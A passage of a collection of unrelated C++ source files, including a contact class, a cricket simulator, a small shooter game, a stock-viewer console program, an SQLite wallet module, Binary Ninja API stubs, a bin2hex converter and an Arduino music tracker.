*/\n\nvoid Contact::setFirstName(string NewFirstName)\n{\n\tif (FirstName.empty())\n\t\tFirstName = NewFirstName;\n\telse\n\t\tthrow std::runtime_error(\"Contact already have a First Name\");\n}\n\nvoid Contact::setLastName(string NewLastName)\n{\n\tif (LastName.empty())\n\t\tLastName = NewLastName;\n\telse\n\t\tthrow std::runtime_error(\"Contact already have a Last Name\");\n}\n\nvoid Contact::setNickName(string NewNickName)\n{\n\tif (NickName.empty())\n\t\tNickName = NewNickName;\n\telse\n\t\tthrow std::runtime_error(\"Contact already have a Nick Name\");\n}\n\nvoid Contact::setPhoneNumber(string NewPhoneNumber)\n{\n\tif (PhoneNumber.empty())\n\t\tPhoneNumber = NewPhoneNumber;\n\telse\n\t\tthrow std::runtime_error(\"Contact already have a Phone Number\");\n}\n\nvoid Contact::setDarkestSecret(string NewDarkestSecret)\n{\n\tif (DarkestSecret.empty())\n\t\tDarkestSecret = NewDarkestSecret;\n\telse\n\t\tthrow std::runtime_error(\"Contact already have a Darkest Secret\");\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <iomanip>\r\n#include <time.h>\r\n#include <fstream>\r\n#include<sstream>\r\n#include \"HeaderA.h\" \r\nusing namespace std;\r\n\r\n/*\r\n*\tCalls:\r\n*\t\tbatTeamA()\r\n*\t\tbatTeamB()\r\n*/\r\n\r\n\r\n\r\n/*\r\n* Generated BallSequnce in Dynamic array  std::string** balls\r\n\t\t\t\tballs[i][0] ; //add bowler name\r\n\t\t\t\tballs[i][1] ; //add bowler type \"bowler\"\r\n\t\t\t\tballs[i][2] ; //add bowler index from TeamB players 11-6\r\n\t\t\t\tballs[i][3] ; //add over number of the bowler will bowl\r\n*/ \r\nvoid genBallSeqTeamB_A(int oversPerBowler_A, std::string** balls_A, string** bowler_A)\r\n{\r\n\t\r\n\tint count = 0;\r\n\tint overNumber = 0;\r\n\tfor (int k = 0; k < oversPerBowler_A; k++) {\r\n\t\toverNumber++;\r\n\t\tfor (int j = 10; j > 5; j--)\r\n\t\t{\r\n\t\t\tint x = count + 6;\r\n\t\t\tint i = count;\r\n\t\t\tfor (; i < x; i++)// 6balls\r\n\t\t\t{\r\n\t\t\t\tballs_A[i][0] = bowler_A[j][0]; //add bowler name\r\n\t\t\t\tballs_A[i][1] = bowler_A[j][1]; //add bowler type\r\n\t\t\t\tballs_A[i][2] = to_string(j); //add bowler index\r\n\t\t\t\tballs_A[i][3] = to_string(overNumber); //add over number of the bowler\r\n\t\t\t\tcount = count + 1;\r\n\t\t\t\t//cout << balls[i][0]<< balls[i][1] <<  balls[i][2] <<balls[i][3]<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n/*\r\n\t\t//out = -1\r\n\t\t//Wide ball = -2\r\n\t\t//No ball =  -3\r\n\t\t//Regular =  actual score (0 - 6)\r\n\t\t//Wide ball probability = 10%\t\treturn -2\r\n\t\t//No ball probability = 10%\t\t\treturn -3\r\n\t\t//Regular ball probability = 80%\treturn actual score\r\n*/\r\nint ballFunction_A(bool isBowler_A) {\r\n\r\n\tint randOutput; //, outProbOfBatsman;// score\r\n\tbool isRegularBall = false;\r\n\tsrand((unsigned int)time(NULL));\r\n\r\n\trandOutput = rand() % 101;\r\n\tcout << \"randOutput: \" << randOutput << endl;\r\n\r\n\tif (randOutput >= 0 && randOutput <= 10) {\r\n\t\t//wide ball\r\n\t\treturn -2;\r\n\r\n\t}\r\n\telse if (randOutput > 10 && randOutput <= 20) {\r\n\t\t//no ball\r\n\t\treturn -3;\r\n\t}\r\n\telse\r\n\t{\t\t\r\n\t\tisRegularBall = true;// regular ball\t\t\r\n\t}\r\n\r\n\t// regular bal pobability 80%\r\n\tif (isRegularBall) {\r\n\t\tif (isBowler_A == true) {\r\n\t\t\tif (randOutput >= 0 && randOutput <= 50) {\r\n\t\t\t\treturn -1;//out\r\n\t\t\t\t//cout << \"score: \" << score << endl;\r\n\t\t\t}\r\n\t\t\telse if (randOutput > 50 && randOutput <= 100) {\r\n\t\t\t\tsrand((unsigned int)time(NULL));\r\n\t\t\t\treturn rand() % 7;//not out\r\n\t\t\t\t//cout << \"score: \" << score << endl;\r\n\r\n\t\t\t}\r\n\t\t}\r\n\t\telse { // if Batsman\r\n\t\t\tif (randOutput >= 0 && randOutput <= 30) { // 30% probability\r\n\t\t\t\treturn -1;\r\n\t\t\t}\r\n\t\t\telse if (randOutput > 30 && randOutput <= 100) {\r\n\t\t\t\tsrand((unsigned int)time(NULL));\r\n\t\t\t\treturn rand() % 7;\r\n\t\t\t\t//cout << \"score: \" << score << endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\t\r\n}\r\n\r\n\r\n/*batting score array\r\n* column 0 = Runs\r\n* column 1 = Balls\r\n* column 2 = Matches\r\n* column 3 = 4s\r\n* column 4 = 6s\r\n* column 5 = Strike Rate\r\n*/\r\nvoid battingNowTeam_A(\r\n\tint& ballNumber_A,\r\n\tint& currentBatsman_BattingEnd_A,\r\n\tint& currentBatsman_BowlingEnd_A,\r\n\tstring** balls_A,\r\n\tstring** teamABatsman_A,\r\n\tstring battingScoreCardArrayLeft_A[][2],\r\n\tint battingScoreCardArrayRight_A[][6],\r\n\tstring bowlingScoreCardArrayLeft_A[][1],\r\n\tint bowlingScoreCardArrayRight_A[][7],\r\n\tstring** teamBbowler_A,\r\n\tfloat& oversBowled_A,\t\t//current overs bowled\r\n\tint& totalScore_A,\t\t\t//calculate total score\r\n\tfloat& runRate_A,\t\t\t\t//current run rate\r\n\tstring& fallOfWickets_A,\t\t// current fall of wicket \r\n\tstring& bowlerOfMatch_A,\r\n\tstring& batsmanOftheMatch_A,\r\n\tstring& winningTeam_A,\r\n\tstring& matchSummary_A,\r\n\tint& falledWicket_A,\t\t\t//how many wickets falled till now\r\n\tstring& lastBatsManOut_A,\r\n\tint& batsmanIndex_A,\t\t\t//converting string to int\t\t\r\n\tstring& bowlerName_A,\r\n\tint& bowlerIndex_A,\r\n\tint& bowlerOverNumber_A,\r\n\tint totalBalls_A,\r\n\tint oversToExecuteAtOnce\r\n)\r\n{\r\n\tint score_A; //variable for switch block\r\n\tbool isBatsmanOutNow_A = false;\r\n\t//Strike rate = (runs scored / balls faced) \u00d7 100\r\n\tfloat ballFacedbyNewBatsman_A = 0;\r\n\tfloat runsByNewBatsman_A = 0;\r\n\r\n\t//inser playing for both current batsmen\r\n\tteamABatsman_A[currentBatsman_BattingEnd_A][2] = \"Playing...  \";\r\n\tcout << \"currentBatsman_BattingEnd\" << teamABatsman_A[currentBatsman_BattingEnd_A][0];\r\n\tteamABatsman_A[currentBatsman_BowlingEnd_A][2] = \"Playing...  \";\r\n\tcout << \"currentBatsman_BowlingEnd\" << teamABatsman_A[currentBatsman_BowlingEnd_A][0];\r\n\t//loop will work untill a batsman gets out\r\n\tdo\r\n\t{\r\n\t\t//string** batsmenArrayTeamA = showTeamA();\r\n\t\tstring strCurrentBM_A = teamABatsman_A[currentBatsman_BattingEnd_A][0];\r\n\t\tstring strCurrentBMType_A = teamABatsman_A[currentBatsman_BattingEnd_A][1];\r\n\r\n\t\t//increment ball ballNumber\r\n\t\tballNumber_A++;\r\n\t\t\r\n\r\n\t\tbatsmanIndex_A = currentBatsman_BattingEnd_A;\r\n\t\tbowlerName_A = balls_A[ballNumber_A - 1][0];\r\n\t\tbowlerIndex_A = std::stoi(balls_A[ballNumber_A - 1][2]);\r\n\t\tbowlerOverNumber_A = std::stoi(balls_A[ballNumber_A - 1][3]);\r\n\r\n\t\tbool isBowler_A; //is batsman a bowler?\r\n\r\n\t\t//check if batsman is bowler \r\n\t\tint res = strCurrentBMType_A.compare(\"Bowler\");\r\n\t\tif (res == 0) // if bowler\r\n\t\t\tisBowler_A = true;\r\n\t\telse //For Batsman or WicketKeeper\r\n\t\t\tisBowler_A = false;\r\n\r\n\t\t//if over is changed, swap batsman\r\n\t\tif (",
    "#include \"Init.hpp\"\r\n#include \"ChildEntities.hpp\"\r\n#include <iostream>\r\n#include <cmath>\r\n\r\nstd::vector<std::shared_ptr<Bullet>> bullets;\r\nstd::vector<ShooterEntity> shooterEntites;\r\n\r\nstd::shared_ptr<ShooterEntity> Shooter;\r\n\r\nsize_t BulletCount = 0;\r\n\r\nvoid App::Init(void)\r\n{\r\n\tthis->AddTexture(\"Bullet\", \"textures/bullet.png\");\r\n\tthis->AddTexture(\"Shooter\", \"textures/shooter.png\");\r\n\r\n\r\n    Jam::BoxData data;\r\n    data.Vertices = {\r\n        glm::vec2(-0.09, +0.09),\r\n        glm::vec2(+0.09, +0.09),\r\n        glm::vec2(-0.09, -0.09),\r\n        glm::vec2(+0.09, -0.09)\r\n    };\r\n\r\n    data.TexCords = {\r\n        glm::vec2(-1.0, +1.0),\r\n        glm::vec2(+1.0, +1.0),\r\n        glm::vec2(-1.0, -1.0),\r\n        glm::vec2(+1.0,-1.0)\r\n    };\r\n\r\n    data.Tint = {\r\n        glm::vec4(1.0, 1.0, 1.0, 1.0),\r\n        glm::vec4(1.0, 1.0, 1.0, 1.0),\r\n        glm::vec4(1.0, 1.0, 1.0, 1.0),\r\n        glm::vec4(1.0, 1.0, 1.0, 1.0)\r\n    };\r\n\r\n    data.TextureName = \"Shooter\";\r\n\tstd::shared_ptr<Jam::Box2DEntity> shooter = std::make_shared<ShooterEntity>(data);\r\n\tthis->AddEntity(\"player\", shooter);\r\n\r\n    Shooter = std::dynamic_pointer_cast<ShooterEntity>(shooter);\r\n    if (Shooter == nullptr)\r\n    {\r\n        spdlog::error(\"Dynamic cast failed!\");\r\n        DebugBreak();\r\n    }\r\n}\r\n\r\nvoid App::Update(double delta)\r\n{\r\n\t //memory leak incoming\r\n    if (m_InputHandler.MouseLeftClicked())\r\n    {\r\n\r\n        //gotta center this shit\r\n        glm::vec2 entityPoint = Shooter->GetBoxData().Vertices[0];\r\n        glm::vec2 mousePoint = m_InputHandler.GetMousePos(glm::vec2(1, 1));\r\n        \r\n        auto GetUnitVector = [](glm::vec2 v)\r\n            {\r\n                double magnitude = sqrt(v.x * v.x + v.y * v.y);\r\n                return glm::vec2(v.x / magnitude, v.y / magnitude);\r\n            };\r\n\r\n        std::shared_ptr<Bullet> bullet = Shooter->Shoot(GetUnitVector(mousePoint - entityPoint), BulletOffsetFromEnitity);\r\n\r\n        //std::string bname = std::string(\"Bullet\") + std::to_string(BulletCount++);\r\n        this->AddEntity(\"Bullet\" +  std::to_string(BulletCount++), bullet);\r\n        //bullets.push_back(bullet);\r\n    }\r\n\r\n    if (m_InputHandler.KeyPressed(Jam::Key::ONE))\r\n    {\r\n        Jam::EnableWireframeMode();\r\n    }\r\n    if (m_InputHandler.KeyPressed(Jam::Key::TWO))\r\n    {\r\n        Jam::DisableWireframeMode();\r\n    }\r\n}\r\n\r\nint main(void)\r\n{\r\n\tJam::ContextInfo info;\r\n\tApp app(info);\r\n    app.Init();\r\n\tapp.Run();\r\n}",
    "#include \"functions.h\"\n#include <iostream>\n#include<bits/stdc++.h>\nusing namespace std;\n\n//Simply calculates a percentage and then displays it\nvoid ProfitLoss(float open, float close, string name) {\n    float percentage_change = ((close - open) / open) * 100;\n\n    if (percentage_change > 0) {\n        cout << \"\\n\" + name + \" has gained \" << percentage_change << \"%\\n\";\n    } else if (percentage_change < 0) {\n        cout << \"\\n\" + name + \" has loss \" << percentage_change << \"%\\n\";\n    } else {\n        cout << \"\\nThe \" + name + \" stocks has not changed\" << \"\\n\";\n    }\n}\n\nvoid wantTransact(float price, float high, float low, string ans, int amount) {\n    string shouldBuy;\n    bool stopLoop=false;\n\n    if(price <= low){\n        cout << \"Tip: This stock is doing well\\n\";\n    }\n    else if(price >= high){\n        cout << \"Tip: This stock is not doing well\\n\";\n    }\n    else{\n        cout << \"Tip: Not much activity for this stock\" << endl;\n    }\n\n    while(stopLoop==false){\n        cout << \"Would you like to buy this stock?:\"<< endl;\n        cin >> shouldBuy;\n        for(char &c : shouldBuy) {\n                c = tolower(c); \n            }\n        if(shouldBuy==\"n\")return;\n        if(shouldBuy==\"y\"){\n            stopLoop=true;\n            break;\n        }\n        cout << \"Invalid input. Please only enter Y or N.\" << endl;\n    }\n\n    cout << \"Input the number of shares to buy/sell:\" << endl;\n    cin >> amount;\n    cout << \"You brought \";\n    cout << amount;\n    cout << \" shares.\"<<endl;\n}\n\nvoid print_data(string name, string exchange, string currency, float open, float high, float low, float close, float volume, float change, float price) {\n    cout << \"\\nGenerating Data...\\n\\n\";\n    cout <<\n        \"Name: \" << name << \"\\n\" <<\n        \"Exchange: \" << exchange << \"\\n\" <<\n        \"Currency:\" << currency << \"\\n\" <<\n        \"Open price: \" << open << \"\\n\" <<\n        \"High price: \" << high << \"\\n\" <<\n        \"Low price: \" << low << \"\\n\" <<\n        \"Close price: \" << close << \"\\n\" <<\n        \"Volume:\" << volume << \"\\n\" <<\n        \"Change: \" << change << \"\\n\" <<\n        \"Current Price: \" << price << \"\\n\";\n}\n\nbool ContinueSim(){\n    while(true){\n        string answer;\n        cout << \"Would you like to look at another an stock? Y/N:\" << endl;\n        cin >> answer;\n        for (char &c : answer) {\n            c = tolower(c); \n        }\n        if(answer==\"n\")return false;\n        if(answer==\"y\")return true;\n        cout <<\"Invalid Input, you can only enter y or n.\"<< endl;\n    }\n}\n\nvoid printTerminationMessage() {\n    cout << \"Program is terminating.\" << endl;\n}\n",
    "#include \"wallet.hpp\"\n#include \"precompiled.hpp\"\n\nnamespace exchange::modules\n{\n    Wallet::Wallet(SQLite::Database& database, std::optional<std::filesystem::path> const log_path)\n        : m_database(&database)\n    {\n        std::vector<spdlog::sink_ptr> sinks{std::make_shared<spdlog::sinks::stdout_color_sink_mt>()};\n        if (log_path)\n        {\n            sinks.emplace_back(std::make_shared<spdlog::sinks::basic_file_sink_mt>(log_path.value().string()));\n        }\n        auto logger = std::make_shared<spdlog::logger>(\"wallet\", sinks.begin(), sinks.end());\n        spdlog::initialize_logger(logger);\n\n        if (!database.tableExists(\"wallets\"))\n        {\n            try\n            {\n                SQLite::Statement statement(\n                    *m_database, \"CREATE TABLE wallets (id INTEGER PRIMARY KEY, user_id INTEGER, currency TEXT)\");\n                statement.exec();\n            }\n            catch (SQLite::Exception e)\n            {\n                spdlog::get(\"wallet\")->log(spdlog::level::critical, e.what());\n                std::exit(EXIT_FAILURE);\n            }\n        }\n\n        if (!database.tableExists(\"transactions\"))\n        {\n            try\n            {\n                SQLite::Statement statement(*m_database,\n                                            \"CREATE TABLE transactions (id INTEGER PRIMARY KEY, wallet_id \"\n                                            \"INTEGER, amount REAL, transaction_type INTEGER, description TEXT)\");\n                statement.exec();\n            }\n            catch (SQLite::Exception e)\n            {\n                spdlog::get(\"wallet\")->log(spdlog::level::critical, e.what());\n                std::exit(EXIT_FAILURE);\n            }\n        }\n    }\n\n    Wallet::~Wallet()\n    {\n        spdlog::drop(\"wallet\");\n    }\n\n    auto Wallet::create_wallet(uint64_t const user_id, std::string_view const currency, uint64_t& wallet_id) -> bool\n    {\n        try\n        {\n            SQLite::Statement statement(*m_database,\n                                        \"INSERT INTO wallets (user_id, currency) VALUES (?, ?) RETURNING id\");\n            statement.bind(1, static_cast<int64_t>(user_id));\n            statement.bind(2, std::string(currency));\n            if (statement.executeStep())\n            {\n                wallet_id = statement.getColumn(0).getInt64();\n            }\n            return true;\n        }\n        catch (SQLite::Exception e)\n        {\n            spdlog::get(\"wallet\")->log(spdlog::level::err, e.what());\n            return false;\n        }\n    }\n\n    auto Wallet::make_transaction(uint64_t const wallet_id, float const amount,\n                                  WalletTransactionType const transaction_type,\n                                  std::string_view const description) -> bool\n    {\n        try\n        {\n            SQLite::Statement statement(*m_database, \"INSERT INTO transactions (wallet_id, amount, \"\n                                                     \"transaction_type, description) VALUES (?, ?, ?, ?)\");\n            statement.bind(1, static_cast<int64_t>(wallet_id));\n            statement.bind(2, amount);\n            statement.bind(3, static_cast<uint32_t>(transaction_type));\n            statement.bind(4, std::string(description));\n            return statement.exec() > 0;\n        }\n        catch (SQLite::Exception e)\n        {\n            spdlog::get(\"wallet\")->log(spdlog::level::err, e.what());\n            return false;\n        }\n    }\n\n    auto Wallet::wallets(uint64_t const user_id) -> std::optional<std::vector<WalletInfo>>\n    {\n        try\n        {\n            std::vector<WalletInfo> wallet_infos;\n            {\n                SQLite::Statement statement(*m_database, \"SELECT id, currency FROM wallets WHERE user_id = ?\");\n                statement.bind(1, static_cast<int64_t>(user_id));\n\n                while (statement.executeStep())\n                {\n                    WalletInfo wallet_info{.id = static_cast<uint64_t>(statement.getColumn(0).getInt64()),\n                                           .currency = statement.getColumn(1).getString()};\n                    wallet_infos.emplace_back(std::move(wallet_info));\n                }\n            }\n\n            for (auto& wallet_info : wallet_infos)\n            {\n                float amount = 0.0f;\n\n                {\n                    SQLite::Statement statement(\n                        *m_database,\n                        \"SELECT SUM(amount) FROM transactions WHERE wallet_id = ? and transaction_type = 1\");\n                    statement.bind(1, static_cast<int64_t>(wallet_info.id));\n\n                    if (statement.executeStep())\n                    {\n                        amount = statement.getColumn(0).getDouble();\n                    }\n                }\n\n                {\n                    SQLite::Statement statement(\n                        *m_database,\n                        \"SELECT SUM(amount) FROM transactions WHERE wallet_id = ? and transaction_type = 0\");\n                ",
    "// Analysis\r\n\r\n#include \"core_impl.h\"\r\n\r\nBINARYNINJACOREAPI void BNAddAnalysisOption(BNBinaryView* view, const char* name) { __debugbreak(); }\r\nBINARYNINJACOREAPI BNFunction* BNAddFunctionForAnalysis(\r\n\tBNBinaryView* view, BNPlatform* platform, uint64_t addr, bool autoDiscovered, BNType* type) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNAddEntryPointForAnalysis(BNBinaryView* view, BNPlatform* platform, uint64_t addr) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNRemoveAnalysisFunction(BNBinaryView* view, BNFunction* func, bool updateRefs) { __debugbreak(); }\r\nBINARYNINJACOREAPI BNFunction* BNCreateUserFunction(BNBinaryView* view, BNPlatform* platform, uint64_t addr)\r\n{\r\n\t// TODO: for now we allow creating a function without view\r\n\treturn new BNFunction(platform->mArch, addr);\r\n}\r\nBINARYNINJACOREAPI void BNRemoveUserFunction(BNBinaryView* view, BNFunction* func) { __debugbreak(); }\r\nBINARYNINJACOREAPI bool BNHasInitialAnalysis(BNBinaryView* view) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNSetAnalysisHold(BNBinaryView* view, bool enable) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNUpdateAnalysisAndWait(BNBinaryView* view) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNUpdateAnalysis(BNBinaryView* view) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNAbortAnalysis(BNBinaryView* view) { __debugbreak(); }\r\nBINARYNINJACOREAPI bool BNIsFunctionUpdateNeeded(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNRequestAdvancedFunctionAnalysisData(BNFunction* func) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNReleaseAdvancedFunctionAnalysisData(BNFunction* func) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNReleaseAdvancedFunctionAnalysisDataMultiple(BNFunction* func, size_t count) { __debugbreak(); }\r\n\r\nBINARYNINJACOREAPI BNFunction* BNNewFunctionReference(BNFunction* func)\r\n{\r\n\treturn BNRef::Add(func);\r\n}\r\nBINARYNINJACOREAPI void BNFreeFunction(BNFunction* func)\r\n{\r\n\tBNRef::Release(func);\r\n}\r\nBINARYNINJACOREAPI BNFunction** BNGetAnalysisFunctionList(BNBinaryView* view, size_t* count) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNFreeFunctionList(BNFunction** funcs, size_t count) { __debugbreak(); }\r\nBINARYNINJACOREAPI bool BNHasFunctions(BNBinaryView* view) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI bool BNHasSymbols(BNBinaryView* view) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI bool BNHasDataVariables(BNBinaryView* view) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNFunction* BNGetAnalysisFunction(BNBinaryView* view, BNPlatform* platform, uint64_t addr) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNFunction* BNGetRecentAnalysisFunctionForAddress(BNBinaryView* view, uint64_t addr) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNFunction** BNGetAnalysisFunctionsForAddress(BNBinaryView* view, uint64_t addr, size_t* count) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNFunction** BNGetAnalysisFunctionsContainingAddress(\r\n\tBNBinaryView* view, uint64_t addr, size_t* count) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNFunction* BNGetAnalysisEntryPoint(BNBinaryView* view) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNFunction** BNGetAllEntryFunctions(BNBinaryView* view, size_t* count) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNAddToEntryFunctions(BNBinaryView* view, BNFunction* func) { __debugbreak(); }\r\n\r\nBINARYNINJACOREAPI char* BNGetGlobalCommentForAddress(BNBinaryView* view, uint64_t addr) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI uint64_t* BNGetGlobalCommentedAddresses(BNBinaryView* view, size_t* count) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNSetGlobalCommentForAddress(BNBinaryView* view, uint64_t addr, const char* comment) { __debugbreak(); }\r\n\r\nBINARYNINJACOREAPI BNBinaryView* BNGetFunctionData(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNArchitecture* BNGetFunctionArchitecture(BNFunction* func)\r\n{\r\n\tfunc->mArch->AddRef(); // TODO: correct?\r\n\treturn func->mArch;\r\n}\r\nBINARYNINJACOREAPI BNPlatform* BNGetFunctionPlatform(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI uint64_t BNGetFunctionStart(BNFunction* func)\r\n{\r\n\treturn func->mStart;\r\n}\r\nBINARYNINJACOREAPI BNSymbol* BNGetFunctionSymbol(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI bool BNWasFunctionAutomaticallyDiscovered(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI bool BNFunctionHasUserAnnotations(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNBoolWithConfidence BNCanFunctionReturn(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI BNBoolWithConfidence BNIsFunctionPure(BNFunction* func) { __debugbreak(); return {}; }\r\nBINARYNINJACOREAPI void BNSetFunctionAutoType(BNFunction* func, BNType* type) { __debugbreak(); }\r\nBINARYNINJACOREAPI void BNSetFunctionUserType(BNFunction* func, BNType* type) { __debugbreak(); }\r\nBINARYNINJACOREAPI bool BNFunctionHasUserType(BNFunc",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <filesystem>\n#include <vector>\n#include <iomanip>\n\n\nint main(int argC, char* argV[])\n{\n\tstd::filesystem::path inputFilePath;\n\tstd::filesystem::path outputFilePath;\n\tstd::string outputFileFormat;\n\n\t// check number of arguments\n\tif (argC != 3 && argC != 4)\n\t{\n\t\tstd::cout << \"error: invalid number of arguments!\" << std::endl;\n\t\tstd::cout << \"usage: bin2hex <input file> -mem [<output file>]\" << std::endl;\n\t\tstd::cout << \"usage: bin2hex <input file> -coe [<output file>]\" << std::endl;\n\t\treturn -1;\n\t}\n\n\tinputFilePath = argV[1];\n\toutputFileFormat = argV[2];\n\n\tif (outputFileFormat != \"-mem\" && outputFileFormat != \"-coe\")\n\t{\n\t\tstd::cout << \"error: invalid output file format!\" << std::endl;\n\t\treturn -1;\n\t}\n\n\t// input path only\n\tif (argC == 3)\n\t{\n\t\t// output path equals input path with replaced/appended file extension\n\t\toutputFilePath.replace_extension(outputFileFormat.substr(1));\n\t}\n\t// input and output path\n\telse if (argC == 4)\n\t\toutputFilePath = argV[3];\n\n\t// open input file\n\tstd::ifstream inputFile(inputFilePath, std::ios::binary);\n\tif (!inputFile.is_open())\n\t{\n\t\tstd::cout << \"error: cannot open input file \" << inputFilePath << \"!\" << std::endl;\n\t\treturn -1;\n\t}\n\t// read input file into vector\n\tstd::vector<char> data{ std::istreambuf_iterator<char>(inputFile), std::istreambuf_iterator<char>() };\n\tinputFile.close();\n\n\t// make sure data is word aligned\n\twhile (data.size() % 4 != 0)\n\t\tdata.push_back(0x00);\n\n\t// open output file\n\tstd::ofstream outputFile(outputFilePath, std::ios::trunc);\n\tif (!outputFile.is_open())\n\t{\n\t\tstd::cout << \"error: cannot open or create output file \" << outputFilePath << \"!\" << std::endl;\n\t\treturn -1;\n\t}\n\n\t// start the conversion\n\tstd::cout << \"generating \" << outputFilePath << \"...\" << std::endl;\n\n\tif (outputFileFormat == \"-coe\")\n\t{\n\t\toutputFile << \"memory_initialization_radix=16;\" << std::endl;\n\t\toutputFile << \"memory_initialization_vector=\" << std::endl;\n\t}\n\n\tfor (unsigned int i = 0; i < data.size(); i += 4)\n\t{\n\t\toutputFile << std::hex << std::setfill('0') << std::setw(8)\n\t\t\t<< *reinterpret_cast<uint32_t*>(&data.at(i));\n\n\t\tif (outputFileFormat == \"-coe\")\n\t\t{\n\t\t\tif (i != data.size() - 4)\n\t\t\t\toutputFile << ',' << std::endl;\n\t\t\telse\n\t\t\t\toutputFile << ';';\n\t\t}\n\t\telse if (i != data.size() - 4)\n\t\t\toutputFile << std::endl;\n\t}\n\n\tstd::cout << \"done.\" << std::endl;\n\n\toutputFile.close();\n\treturn 0;\n}\n",
    "#include <Arduino.h>\n#include \"Tracker.h\"\n#include \"Voice.h\"\n\nTracker::Tracker() {\n  patternLength = 32;\n  isPlaying = true;\n  bpms[0] = 120;\n  bpms[1] = 132;\n  bpms[2] = 145;\n  bpms[3] = 180;\n  SetBPM(0);\n\n  for (int j = 0; j < 4; j++) {\n    for (int i = 0; i < 256; i++) {\n      tracks[j][i] = 0;\n    }\n  }\n  ClearAll(0);\n}\n\nint Tracker::UpdateTracker() {\n  float curTime = millis();\n  float delta = curTime - lastMillis;\n  tempoBlink = 0;\n  lastMillis = curTime;\n\n  if (!isPlaying)\n    delta = 0;\n\n  beatTime += delta * bps;\n  noteTime += delta * bps;\n  if (beatTime > 1000) {\n    beatTime -= 1000;\n    barCount++;\n    tempoBlink = 20;\n    if (barCount > 7) {\n      tempoBlink = 100;\n      barCount = 0;\n    }\n  }\n\n  if (noteTime > 250) {\n    noteTime -= 250;\n    trackIndex++;\n\n    if (trackIndex >= patternLength * (currentPattern + 1)) {\n      trackIndex = patternLength * (currentPattern + 0);\n      if (allPatternPlay) {\n        currentPattern++;\n        if (currentPattern > 3) {\n          currentPattern -= 4;\n        }\n        trackIndex = patternLength * (currentPattern + 0);\n      }\n    }\n\n    int trackIndexBehind = trackIndex - 1;\n    if (trackIndexBehind < patternLength * (currentPattern + 0)) {\n      trackIndexBehind = patternLength * (currentPattern + 1) + trackIndexBehind;\n    }\n\n    for (int i = 0; i < 4; i++) {\n      int note = tracks[i][trackIndexBehind];\n      int optOctave = trackOctaves[i][trackIndexBehind];\n      int optInstrument = trackInstruments[i][trackIndexBehind];\n      int noteDelay = tracks[i][trackIndexBehind];\n      if (note > 0) {\n        heldNotes[i] = note;\n        heldInsturments[i] = currentVoice;\n        voices[i].SetNote(note - 1, false, optOctave, optInstrument);\n        //} else if (voices[i].arpNum > 0) {\n        // voices[i].SetNote(heldNotes[i] - 1, false, -1, heldInsturments[i] - 1);\n      } else if (voices[i].delay > 0) {\n        int delayIndex = trackIndexBehind - voices[i].delay * 2;\n        if (delayIndex < patternLength * (currentPattern + 0)) {\n          delayIndex = patternLength * (currentPattern + 1) + delayIndex;\n        }\n        int delayNote = tracks[i][delayIndex];\n        if (delayNote > 0) {\n          optInstrument = trackInstruments[i][delayIndex];\n          voices[i].SetNote(delayNote - 1, true, -1, optInstrument);\n        }\n      }\n    }\n  }\n\n  sample = 0;\n  sample2 = 0;\n  for (int i = 0; i < 4; i++) {\n    sample += voices[i].UpdateVoice() / (3 + masterVolume * 5);\n  }\n\n  return 0;\n}\n\nvoid Tracker::SetCommand(char command, int val) {\n  switch (command) {\n    case 'T':\n      SetTrackNum(val);\n      break;\n    case 'B':\n      SetBPM(val);\n      break;\n    case 'N':\n      if (!pressedOnce) {\n        noteTime = 0;\n        beatTime = 0;\n        trackIndex = 0;\n      }\n      pressedOnce = true;\n      SetNote(val, selectedTrack);\n      break;\n    case 'O':\n      SetOctave(val);\n      break;\n    case 'L':\n      SetEnvelopeLength(val);\n      break;\n    case 'E':\n      SetEnvelopeNum(val);\n      break;\n    case 'V':\n      SetVolume(val);\n      break;\n    case 'D':\n      SetDelay(val);\n      break;\n    case 'A':\n      SetArp(val);\n      break;\n    case '^':\n      ClearTrackNum(val);\n      break;\n    case '$':\n      SetPatternNum(val);\n      break;\n    case '#':\n      ClearPatternNum(val);\n      break;\n    case 'X':\n      ClearAll(val);\n      break;\n    case 'P':\n      TogglePlayStop();\n      break;\n    case 'I':\n      currentVoice = val;\n      break;\n    case 'H':\n      masterVolume++;\n      if (masterVolume > 1)\n        masterVolume = 0;\n      break;\n    case 'C':\n      allPatternPlay = !allPatternPlay;\n      break;\n    case '*':\n      if (val == 0)\n        CopyPattern();\n      if (val == 1) {\n        PastePattern();\n      }\n      if (val == 2) {\n        PastePatternAll();\n      }\n      break;\n  }\n}\n\nvoid Tracker::SetArp(int val) {\n  voices[selectedTrack].SetArpNum(val);\n};\n\nvoid Tracker::SetBPM(int val) {\n  bpm = bpms[val];\n  bps = bpm / 60;\n};\n\nvoid Tracker::SetDelay(int 